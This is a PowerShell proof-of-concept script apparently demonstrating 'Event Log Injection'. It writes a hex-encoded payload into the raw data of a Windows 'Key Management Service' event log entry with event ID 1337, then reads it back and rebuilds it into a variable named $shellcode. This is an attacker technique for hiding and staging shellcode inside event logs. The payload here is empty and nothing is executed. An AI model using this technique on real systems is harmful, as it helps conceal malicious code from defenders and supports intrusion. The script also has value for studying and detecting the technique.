Write-Host "Event Log Injection"

# $payload = Read-Host ("Payload as hex string: ")
$payload = ''

## Default Variables

$1 = 'Key Management Service'
$2 = 'KmsRequests'
$3 = '1337'
$4 = 'Payloads Found Here'

## Convert $payload hex string into byte raw

$hashByteArray = [byte[]] ($payload -replace '..', '0x$&,' -split ',' -ne '')

# Create Event Log

Write-EventLog -LogName $1 -Source $2 -EventId $3 -EntryType Information -Category 0 -Message $4 -RawData $hashByteArray

# Sleep to allow user to see log in Event Viewer

Start-Sleep -Seconds 10

Write-Host ""
Write-Host "### Pulling payload out of Event Log ###"
Write-Host ""

$a = Get-EventLog -LogName $1 -Source $2 -InstanceId 1337 -Newest 1

Write-Host "Payload Found. Converting to string..."
Write-Host ""
$shellcode = ($a.Data | Format-Hex | Select-Object -Expand Bytes | ForEach-Object { '{0:x2}' -f $_}) -join ''
Write-Host "Payload = $shellcode"